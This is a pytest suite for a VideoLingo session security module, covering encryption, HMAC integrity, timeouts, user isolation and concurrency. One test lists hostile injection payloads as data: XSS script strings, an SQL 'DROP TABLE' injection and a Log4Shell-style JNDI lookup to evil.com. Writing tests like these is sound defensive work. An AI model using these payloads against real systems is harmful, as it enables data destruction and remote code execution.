"""
Comprehensive Session Security Tests
====================================

Tests for the VideoLingo session security system covering:
- Session creation and validation
- Encryption and integrity protection  
- User isolation and access control
- Timeout and cleanup mechanisms
- Security vulnerability prevention
- Concurrent session handling

Author: VideoLingo Security Team
Last Updated: 2025-08-21
Test Coverage: HIGH PRIORITY
"""

import pytest
import time
import uuid
import json
import os
import tempfile
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta
from threading import Thread
import concurrent.futures

# Mock Streamlit before imports
import sys
sys.modules['streamlit'] = Mock()

from core.utils.session_security import (
    SecureSessionManager,
    SessionConfig,
    SessionEncryption, 
    SessionValidator,
    SecureSessionState,
    SessionSecurityContext,
    SessionMetadata,
    SessionSecurityError,
    SessionValidationError,
    SessionIsolationError,
    SessionTimeoutError,
    SessionIntegrityError,
    get_session_manager,
    get_secure_session_state,
    require_valid_session,
    session_audit_log,
    secure_session_cleanup,
    get_session_security_status
)


class TestSessionEncryption:
    """Test session data encryption and decryption"""
    
    def test_encryption_basic(self):
        """Test basic encryption and decryption"""
        encryptor = SessionEncryption("test_master_key")
        test_data = {"key1": "value1", "key2": 123, "key3": ["a", "b", "c"]}
        
        # Encrypt data
        encrypted = encryptor.encrypt(test_data)
        assert isinstance(encrypted, str)
        assert len(encrypted) > 0
        
        # Decrypt data
        decrypted = encryptor.decrypt(encrypted)
        assert decrypted == test_data
    
    def test_encryption_with_complex_data(self):
        """Test encryption with complex nested data"""
        encryptor = SessionEncryption("test_master_key")
        complex_data = {
            "user_data": {
                "video_id": "abc123",
                "settings": {
                    "quality": "1080p",
                    "subtitles": True,
                    "metadata": {
                        "created": "2025-08-21",
                        "tags": ["video", "processing"]
                    }
                }
            },
            "session_info": {
                "created_at": datetime.now().isoformat(),
                "access_count": 5
            }
        }
        
        encrypted = encryptor.encrypt(complex_data)
        decrypted = encryptor.decrypt(encrypted)
        
        # Convert datetime strings back for comparison
        assert decrypted["user_data"]["video_id"] == "abc123"
        assert decrypted["user_data"]["settings"]["quality"] == "1080p"
        assert len(decrypted["user_data"]["settings"]["metadata"]["tags"]) == 2
    
    def test_encryption_key_derivation(self):
        """Test that different master keys produce different encryption"""
        data = {"test": "data"}
        
        encryptor1 = SessionEncryption("key1")
        encryptor2 = SessionEncryption("key2")
        
        encrypted1 = encryptor1.encrypt(data)
        encrypted2 = encryptor2.encrypt(data)
        
        # Different keys should produce different encrypted data
        assert encrypted1 != encrypted2
        
        # But each should decrypt correctly with its own key
        assert encryptor1.decrypt(encrypted1) == data
        assert encryptor2.decrypt(encrypted2) == data
    
    def test_encryption_invalid_data(self):
        """Test encryption with invalid data"""
        encryptor = SessionEncryption("test_key")
        
        with pytest.raises(SessionSecurityError):
            # Mock an object that can't be JSON serialized
            invalid_data = {"func": lambda x: x}
            encryptor.encrypt(invalid_data)
    
    def test_decryption_invalid_data(self):
        """Test decryption with corrupted data"""
        encryptor = SessionEncryption("test_key")
        
        with pytest.raises(SessionSecurityError):
            encryptor.decrypt("invalid_encrypted_data")


class TestSessionValidator:
    """Test session data validation and integrity"""
    
    def test_signature_generation_and_verification(self):
        """Test HMAC signature generation and verification"""
        validator = SessionValidator("secret_key")
        test_data = {"key": "value", "number": 123}
        
        # Generate signature
        signature = validator.generate_signature(test_data)
        assert isinstance(signature, str)
        assert len(signature) == 64  # SHA256 hex digest length
        
        # Verify signature
        assert validator.verify_signature(test_data, signature) is True
    
    def test_signature_tampering_detection(self):
        """Test that signature verification detects data tampering"""
        validator = SessionValidator("secret_key")
        original_data = {"key": "value", "number": 123}
        
        signature = validator.generate_signature(original_data)
        
        # Tamper with data
        tampered_data = {"key": "modified_value", "number": 123}
        
        # Verification should fail
        assert validator.verify_signature(tampered_data, signature) is False
    
    def test_signature_key_sensitivity(self):
        """Test that different keys produce different signatures"""
        data = {"test": "data"}
        
        validator1 = SessionValidator("key1")
        validator2 = SessionValidator("key2")
        
        sig1 = validator1.generate_signature(data)
        sig2 = validator2.generate_signature(data)
        
        assert sig1 != sig2
    
    def test_data_type_validation(self):
        """Test validation of session data types"""
        validator = SessionValidator("secret_key")
        
        # Valid data types
        valid_data = {
            "string": "text",
            "integer": 123,
            "float": 12.34,
            "boolean": True,
            "list": [1, 2, 3],
            "dict": {"nested": "value"},
            "none": None
        }
        assert validator.validate_session_data(valid_data) is True
        
        # Invalid data types
        invalid_data = {"function": lambda x: x}
        assert validator.validate_session_data(invalid_data) is False
        
        # Test with custom allowed types
        allowed_types = [str, int]
        assert validator.validate_session_data("string", allowed_types) is True
        assert validator.validate_session_data(123, allowed_types) is True
        assert validator.validate_session_data(12.34, allowed_types) is False


class TestSecureSessionManager:
    """Test the main session manager functionality"""
    
    def setup_method(self):
        """Setup for each test method"""
        config = SessionConfig(
            session_timeout=timedelta(hours=1),
            idle_timeout=timedelta(minutes=15),
            max_concurrent_sessions=3,
            enable_encryption=True,
            enable_integrity_check=True,
            auto_cleanup=False  # Disable for testing
        )
        self.manager = SecureSessionManager(config)
    
    def test_session_creation(self):
        """Test session creation and basic properties"""
        session_id = self.manager.create_session()
        
        assert isinstance(session_id, str)
        assert len(session_id) == 36  # UUID4 length
        assert session_id in self.manager.sessions
        
        metadata = self.manager.sessions[session_id]
        assert isinstance(metadata, SessionMetadata)
        assert metadata.session_id == session_id
        assert metadata.access_count == 1
        assert not metadata.is_expired
    
    def test_session_validation(self):
        """Test session validation logic"""
        session_id = self.manager.create_session()
        
        # Valid session should pass validation
        assert self.manager.validate_session(session_id) is True
        
        # Invalid session ID should fail
        assert self.manager.validate_session("invalid-id") is False
        
        # Expired session should fail
        self.manager.sessions[session_id].is_expired = True
        assert self.manager.validate_session(session_id) is False
    
    def test_session_timeout(self):
        """Test session timeout functionality"""
        # Create session with short timeout
        config = SessionConfig(
            session_timeout=timedelta(milliseconds=10),
            idle_timeout=timedelta(milliseconds=5)
        )
        manager = SecureSessionManager(config)
        
        session_id = manager.create_session()
        assert manager.validate_session(session_id) is True
        
        # Wait for timeout
        time.sleep(0.02)
        assert manager.validate_session(session_id) is False
        assert manager.sessions[session_id].is_expired is True
    
    def test_session_data_operations(self):
        """Test session data set/get/delete operations"""
        session_id = self.manager.create_session()
        
        # Set session value
        self.manager.set_session_value("test_key", "test_value", session_id)
        
        # Get session value
        value = self.manager.get_session_value("test_key", session_id=session_id)
        assert value == "test_value"
        
        # Get with default
        default_value = self.manager.get_session_value("nonexistent", "default", session_id)
        assert default_value == "default"
        
        # Delete session value
        deleted = self.manager.delete_session_value("test_key", session_id)
        assert deleted is True
        
        # Verify deletion
        value = self.manager.get_session_value("test_key", "not_found", session_id)
        assert value == "not_found"
    
    def test_session_integrity_protection(self):
        """Test session data integrity protection"""
        session_id = self.manager.create_session()
        
        # Set some data
        self.manager.set_session_value("secure_data", "important_value", session_id)
        
        # Verify integrity check passes
        assert self.manager._verify_session_integrity(session_id) is True
        
        # Tamper with session data directly
        self.manager.session_data[session_id]["secure_data"] = "tampered_value"
        
        # Integrity check should fail
        assert self.manager._verify_session_integrity(session_id) is False
        
        # Getting value should raise integrity error
        with pytest.raises(SessionIntegrityError):
            self.manager.get_session_value("secure_data", session_id=session_id)
    
    def test_session_size_limits(self):
        """Test session data size limits"""
        config = SessionConfig(max_session_size=1024)  # 1KB limit
        manager = SecureSessionManager(config)
        session_id = manager.create_session()
        
        # Small data should work
        manager.set_session_value("small", "data", session_id)
        
        # Large data should fail
        large_data = "x" * 2048  # 2KB
        with pytest.raises(SessionValidationError):
            manager.set_session_value("large", large_data, session_id)
    
    def test_session_cleanup(self):
        """Test expired session cleanup"""
        # Create sessions with short timeout
        config = SessionConfig(
            session_timeout=timedelta(milliseconds=10),
            auto_cleanup=False
        )
        manager = SecureSessionManager(config)
        
        session1 = manager.create_session()
        session2 = manager.create_session()
        
        # Let sessions expire
        time.sleep(0.02)
        
        # Manual cleanup
        cleaned = manager.cleanup_expired_sessions()
        assert cleaned == 2
        assert len(manager.sessions) == 0
    
    def test_concurrent_session_protection(self):
        """Test protection against concurrent session access"""
        session_id = self.manager.create_session()
        
        def set_values(start_val):
            for i in range(start_val, start_val + 10):
                try:
                    self.manager.set_session_value(f"key_{i}", f"value_{i}", session_id)
                    time.sleep(0.001)  # Small delay
                except Exception:
                    pass  # Expected during concurrent access
        
        # Run concurrent operations
        threads = []
        for i in range(3):
            thread = Thread(target=set_values, args=(i * 10,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Session should still be valid and have some data
        assert self.manager.validate_session(session_id) is True
        session_data = self.manager.session_data.get(session_id, {})
        assert len(session_data) > 0


class TestSecureSessionState:
    """Test the secure session state wrapper"""
    
    def setup_method(self):
        """Setup for each test method"""
        self.manager = SecureSessionManager()
        self.state = SecureSessionState(self.manager)
    
    def test_dictionary_interface(self):
        """Test dictionary-like interface"""
        # Set value using dictionary syntax
        self.state["test_key"] = "test_value"
        
        # Get value using dictionary syntax
        assert self.state["test_key"] == "test_value"
        
        # Check membership
        assert "test_key" in self.state
        assert "nonexistent" not in self.state
        
        # Delete value
        del self.state["test_key"]
        assert "test_key" not in self.state
    
    def test_get_method(self):
        """Test get method with default values"""
        self.state["existing"] = "value"
        
        assert self.state.get("existing") == "value"
        assert self.state.get("nonexistent") is None
        assert self.state.get("nonexistent", "default") == "default"
    
    def test_pop_method(self):
        """Test pop method"""
        self.state["test"] = "value"
        
        popped = self.state.pop("test")
        assert popped == "value"
        assert "test" not in self.state
        
        # Pop nonexistent with default
        popped = self.state.pop("nonexistent", "default")
        assert popped == "default"
    
    def test_update_method(self):
        """Test update method"""
        self.state.update(key1="value1", key2="value2")
        
        assert self.state["key1"] == "value1"
        assert self.state["key2"] == "value2"
    
    def test_clear_method(self):
        """Test clear method"""
        self.state["key1"] = "value1"
        self.state["key2"] = "value2"
        
        self.state.clear()
        
        assert "key1" not in self.state
        assert "key2" not in self.state


class TestSessionSecurityContext:
    """Test session security context manager"""
    
    def test_context_manager_basic(self):
        """Test basic context manager functionality"""
        with SessionSecurityContext() as session:
            assert isinstance(session, SecureSessionState)
            session["test"] = "value"
            assert session["test"] == "value"
    
    def test_context_manager_with_invalid_session(self):
        """Test context manager with invalid session ID"""
        with pytest.raises(SessionValidationError):
            with SessionSecurityContext(session_id="invalid-session"):
                pass
    
    @patch('core.utils.session_security.session_logger')
    def test_context_manager_exception_handling(self, mock_logger):
        """Test context manager exception handling"""
        try:
            with SessionSecurityContext() as session:
                session["test"] = "value"
                raise ValueError("Test exception")
        except ValueError:
            pass
        
        # Verify error was logged
        mock_logger.error.assert_called()


class TestSessionDecorators:
    """Test session security decorators"""
    
    def test_require_valid_session_decorator(self):
        """Test require_valid_session decorator"""
        manager = get_session_manager()
        session_id = manager.create_session()
        
        # Mock Streamlit session state
        with patch('core.utils.session_security.st') as mock_st:
            mock_st.session_state._secure_session_id = session_id
            
            @require_valid_session
            def test_function():
                return "success"
            
            result = test_function()
            assert result == "success"
    
    def test_require_valid_session_with_invalid_session(self):
        """Test require_valid_session with invalid session"""
        with patch('core.utils.session_security.st') as mock_st:
            mock_st.session_state._secure_session_id = "invalid-session"
            
            @require_valid_session
            def test_function():
                return "success"
            
            with pytest.raises(SessionValidationError):
                test_function()
    
    @patch('core.utils.session_security.session_logger')
    def test_session_audit_log_decorator(self, mock_logger):
        """Test session_audit_log decorator"""
        @session_audit_log("test_operation")
        def test_function():
            return "success"
        
        result = test_function()
        assert result == "success"
        
        # Verify logging
        mock_logger.info.assert_called()
        mock_logger.debug.assert_called()


class TestSessionIsolation:
    """Test session isolation between users"""
    
    def test_session_user_isolation(self):
        """Test that different users have isolated sessions"""
        manager = SecureSessionManager()
        
        # Create sessions for different users
        user1_session = manager.create_session({"ip_address": "192.168.1.1"})
        user2_session = manager.create_session({"ip_address": "192.168.1.2"})
        
        # Set data for each user
        manager.set_session_value("user_data", "user1_data", user1_session)
        manager.set_session_value("user_data", "user2_data", user2_session)
        
        # Verify isolation
        user1_data = manager.get_session_value("user_data", session_id=user1_session)
        user2_data = manager.get_session_value("user_data", session_id=user2_session)
        
        assert user1_data == "user1_data"
        assert user2_data == "user2_data"
        assert user1_data != user2_data
    
    def test_session_cross_contamination_prevention(self):
        """Test prevention of cross-session data contamination"""
        manager = SecureSessionManager()
        
        session1 = manager.create_session()
        session2 = manager.create_session()
        
        # Set data in session1
        manager.set_session_value("secret_data", "session1_secret", session1)
        
        # Try to access from session2
        data = manager.get_session_value("secret_data", "not_found", session2)
        assert data == "not_found"  # Should not access session1's data


class TestSecurityVulnerabilityPrevention:
    """Test prevention of common security vulnerabilities"""
    
    def test_session_fixation_prevention(self):
        """Test prevention of session fixation attacks"""
        manager = SecureSessionManager()
        
        # Create multiple sessions and verify they're all unique
        sessions = [manager.create_session() for _ in range(10)]
        assert len(set(sessions)) == 10  # All should be unique
    
    def test_session_hijacking_prevention(self):
        """Test session hijacking prevention through integrity checks"""
        manager = SecureSessionManager()
        session_id = manager.create_session()
        
        # Set sensitive data
        manager.set_session_value("auth_token", "secret_token", session_id)
        
        # Simulate hijacking attempt by modifying session data directly
        manager.session_data[session_id]["auth_token"] = "hijacked_token"
        
        # Integrity check should detect tampering
        with pytest.raises(SessionIntegrityError):
            manager.get_session_value("auth_token", session_id=session_id)
    
    def test_injection_attack_prevention(self):
        """Test prevention of injection attacks through session data"""
        manager = SecureSessionManager()
        session_id = manager.create_session()
        
        # Test various injection payloads
        injection_payloads = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE sessions; --",
            "${jndi:ldap://evil.com/exploit}",
            "{{7*7}}",
            "${7*7}",
            "javascript:alert('xss')",
        ]
        
        for payload in injection_payloads:
            try:
                manager.set_session_value("test_key", payload, session_id)
                stored_value = manager.get_session_value("test_key", session_id=session_id)
                # Value should be stored as-is (properly escaped/sanitized at display time)
                assert stored_value == payload
            except SessionValidationError:
                # Some payloads might be rejected, which is acceptable
                pass
    
    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks on session validation"""
        manager = SecureSessionManager()
        valid_session = manager.create_session()
        
        # Measure time for valid session
        start = time.time()
        manager.validate_session(valid_session)
        valid_time = time.time() - start
        
        # Measure time for invalid session
        start = time.time()
        manager.validate_session("invalid-session-id")
        invalid_time = time.time() - start
        
        # Time difference should be minimal (within reasonable bounds)
        # This is a basic check - in practice, you'd need more sophisticated timing analysis
        assert abs(valid_time - invalid_time) < 0.01  # 10ms tolerance


class TestPerformanceAndLimits:
    """Test performance characteristics and limits"""
    
    def test_session_performance_under_load(self):
        """Test session performance under load"""
        manager = SecureSessionManager()
        session_id = manager.create_session()
        
        # Test rapid session operations
        start_time = time.time()
        
        for i in range(100):
            manager.set_session_value(f"key_{i}", f"value_{i}", session_id)
            manager.get_session_value(f"key_{i}", session_id=session_id)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Should complete within reasonable time (adjust threshold as needed)
        assert total_time < 1.0  # 1 second for 200 operations
    
    def test_concurrent_session_handling(self):
        """Test handling of concurrent sessions"""
        manager = SecureSessionManager()
        results = []
        
        def create_and_use_session():
            session_id = manager.create_session()
            manager.set_session_value("test", "value", session_id)
            value = manager.get_session_value("test", session_id=session_id)
            results.append(value == "value")
        
        # Create concurrent sessions
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(create_and_use_session) for _ in range(20)]
            concurrent.futures.wait(futures)
        
        # All operations should succeed
        assert all(results)
        assert len(results) == 20
    
    def test_memory_cleanup_effectiveness(self):
        """Test that session cleanup effectively releases memory"""
        config = SessionConfig(
            session_timeout=timedelta(milliseconds=1),
            auto_cleanup=False
        )
        manager = SecureSessionManager(config)
        
        # Create many sessions
        session_ids = []
        for i in range(100):
            session_id = manager.create_session()
            session_ids.append(session_id)
            manager.set_session_value("data", f"value_{i}", session_id)
        
        assert len(manager.sessions) == 100
        assert len(manager.session_data) == 100
        
        # Wait for expiration
        time.sleep(0.01)
        
        # Clean up
        cleaned = manager.cleanup_expired_sessions()
        assert cleaned == 100
        assert len(manager.sessions) == 0
        assert len(manager.session_data) == 0


class TestUtilityFunctions:
    """Test utility functions"""
    
    def test_get_session_security_status(self):
        """Test session security status function"""
        status = get_session_security_status()
        
        assert isinstance(status, dict)
        assert "session_id" in status
        assert "is_valid" in status
        assert "encryption_enabled" in status
        assert "integrity_check_enabled" in status
        assert "total_sessions" in status
    
    def test_secure_session_cleanup(self):
        """Test manual session cleanup function"""
        manager = get_session_manager()
        
        # Create session that will expire quickly
        session_id = manager.create_session()
        original_timeout = manager.config.session_timeout
        manager.config.session_timeout = timedelta(milliseconds=1)
        
        time.sleep(0.01)
        
        # Cleanup
        cleaned = secure_session_cleanup()
        assert isinstance(cleaned, int)
        
        # Restore original timeout
        manager.config.session_timeout = original_timeout


# Integration tests
class TestVideoLingoIntegration:
    """Test integration with VideoLingo components"""
    
    @patch('core.utils.session_security.st')
    def test_streamlit_integration(self, mock_st):
        """Test integration with Streamlit session state"""
        # Mock Streamlit session state
        mock_st.session_state = {}
        
        # Get secure session state
        secure_state = get_secure_session_state()
        
        # Test operations
        secure_state["video_id"] = "test-video-123"
        assert secure_state["video_id"] == "test-video-123"
    
    def test_video_input_section_integration(self):
        """Test integration with video input section"""
        # This would test the refactored video_input_section.py
        # For now, just verify the security functions exist
        from core.st_utils.video_input_section import (
            _validate_video_id_access,
            _validate_podcast_info,
            _secure_video_cleanup
        )
        
        # Test video ID validation
        assert _validate_video_id_access("", "download") is False
        assert _validate_video_id_access("invalid", "download") is False
        
        # Test podcast info validation
        assert _validate_podcast_info({}) is False
        assert _validate_podcast_info({"title": "Test", "total_count": 5}) is True
        assert _validate_podcast_info({"title": "x" * 600, "total_count": 5}) is False


if __name__ == "__main__":
    # Run tests with pytest
    pytest.main([__file__, "-v", "--tb=short"])